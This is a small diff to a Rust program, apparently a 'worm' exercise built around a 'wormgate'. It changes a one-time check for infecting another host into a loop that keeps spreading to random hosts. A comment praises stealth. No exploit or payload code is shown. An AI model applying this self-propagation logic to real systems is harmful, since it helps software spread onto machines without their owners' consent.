@@ -317,12 +317,11 @@ fn main() {
             /* Get data from wormgate */
             worm.get_data();
             /* If we should infect another host, do it */
-            if worm.should_infect() {
+            while worm.should_infect() {
                 println!("Infecting another random host");
                 worm.send_to_random_host();
-            } else {
-                println!("I don't know what to do anymore - I'll just die..");
             }
+            println!("Should not infect - I'll just die");
         }
     // Stealth is great
     } else {
